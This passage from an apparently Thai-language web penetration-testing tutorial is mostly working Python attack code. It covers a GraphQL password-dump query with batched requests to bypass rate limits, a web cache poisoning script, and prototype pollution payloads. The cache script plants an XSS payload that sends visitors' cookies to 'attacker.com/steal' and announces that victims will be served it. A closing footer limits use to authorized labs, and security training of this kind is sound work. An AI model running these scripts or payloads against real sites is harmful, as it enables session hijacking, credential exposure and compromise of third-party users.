        '{ allUsers { edges { node { id username email password } } } }',
        
        # Batch queries (bypass rate limiting)
        '[' + ','.join(['{"query":"{user(id:%d){username}}"}'%i for i in range(1,100)]) + ']',
    ]
    
    for q in queries:
        try:
            r = requests.post(url, json={'query': q}, timeout=10)
            print(f"[*] Query: {q[:60]}")
            print(f"    Status: {r.status_code}")
            if 'password' in r.text or 'admin' in r.text:
                print(f"    [!] Sensitive data: {r.text[:300]}")
        except Exception as e:
            print(f"[-] Error: {e}")

print("[*] GraphQL Introspection...")
schema = introspection_query(TARGET)
if schema:
    print(json.dumps(schema, indent=2)[:1000])

print("\n[*] Testing injections...")
graphql_injection(TARGET)

print("\n[*] Testing auth bypass...")
graphql_auth_bypass(TARGET)
```

---

## ขั้นตอนที่ 160: Web Cache Poisoning & Prototype Pollution

### 160.1 Web Cache Poisoning

```python
#!/usr/bin/env python3
# cache_poisoning.py - Web Cache Poisoning

import requests

TARGET = "http://target.com/"

# Cache key headers (ตรวจสอบว่า header ไหนถูก cache)
UNKEYED_HEADERS = [
    'X-Forwarded-Host',
    'X-Forwarded-Scheme',
    'X-Original-URL',
    'X-Rewrite-URL',
    'X-Forwarded-Port',
    'X-Host',
    'X-Forwarded-Server',
]

def test_cache_key_headers(url):
    """Test which headers affect the response but not cache key"""
    # First, get baseline response
    base_r = requests.get(url)
    base_len = len(base_r.text)
    
    for header in UNKEYED_HEADERS:
        # Send with attacker-controlled header value
        poisoned_r = requests.get(
            url,
            headers={header: 'attacker.com'}
        )
        
        if poisoned_r.status_code == 200:
            # Check if header appears in response
            if 'attacker.com' in poisoned_r.text:
                print(f"[+] Reflected header: {header}")
                print(f"    Response contains 'attacker.com'")
                
                # Try to poison with XSS payload
                xss_r = requests.get(
                    url,
                    headers={header: 'attacker.com/><script>alert(1)</script>'}
                )
                if '<script>' in xss_r.text:
                    print(f"    [!] XSS via cache poisoning possible!")

def exploit_cache_poisoning_xss(url, cached_url):
    """Exploit cache poisoning with XSS"""
    # Craft payload
    xss_payload = "attacker.com\"><script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
    
    # Keep sending until cached
    print(f"[*] Poisoning cache for: {cached_url}")
    
    for i in range(10):
        r = requests.get(
            cached_url,
            headers={'X-Forwarded-Host': xss_payload}
        )
        
        # Check if response was cached
        cache_header = r.headers.get('X-Cache', '')
        age_header = r.headers.get('Age', '')
        
        print(f"  Attempt {i+1}: Cache={cache_header}, Age={age_header}")
        
        if cache_header == 'HIT':
            print(f"[+] Cache poisoned! Victims visiting {cached_url} will get XSS")
            break

### 160.2 Prototype Pollution

PROTO_PAYLOADS = [
    # JSON payloads
    '{"__proto__": {"admin": true}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    
    # URL parameter payloads
    '?__proto__[admin]=true',
    '?constructor[prototype][admin]=true',
    
    # Header-based
    'X-Custom-Header: __proto__[admin]=true',
]

def test_prototype_pollution(url):
    """Test for prototype pollution"""
    # Test JSON body
    payloads = [
        {"__proto__": {"isAdmin": "true"}},
        {"constructor": {"prototype": {"isAdmin": "true"}}},
    ]
    
    for payload in payloads:
        r = requests.post(
            url,
            json=payload,
            headers={'Content-Type': 'application/json'}
        )
        
        if 'isAdmin' in r.text or r.status_code == 200:
            print(f"[*] Potential prototype pollution:")
            print(f"    Payload: {payload}")
            print(f"    Response: {r.text[:200]}")

print("[*] Cache Poisoning Test")
test_cache_key_headers(TARGET)
exploit_cache_poisoning_xss(TARGET, TARGET)

print("\n[*] Prototype Pollution Test")
test_prototype_pollution(TARGET + 'api/user/settings')
```

---

## สรุป Part 16

| ขั้นตอน | หัวข้อ | เครื่องมือ/เทคนิค |
|---------|--------|------------------|
| 151 | SQL Injection Advanced | sqlmap, Boolean blind, Time-based, NoSQL |
| 152 | XSS Advanced | DOM XSS, WAF bypass, Selenium scanner |
| 153 | SSRF | Cloud metadata, Redis SSRF, Gopher protocol |
| 154 | XXE Injection | OOB XXE, XInclude, SVG XXE |
| 155 | Deserialization | ysoserial, PHP Object Injection, Pickle |
| 156 | SSTI | Jinja2, Twig, Freemarker RCE |
| 157 | JWT/OAuth Attacks | None alg, Secret brute-force, Token forging |
| 158 | HTTP Smuggling | CL.TE, TE.CL attacks |
| 159 | GraphQL Security | Introspection, Injection, Auth bypass |
| 160 | Cache Poisoning | Unkeyed headers, Prototype pollution |

---
*Part 16 ครอบคลุม Steps 151-160 | ใช้ใน authorized lab environment เท่านั้น*
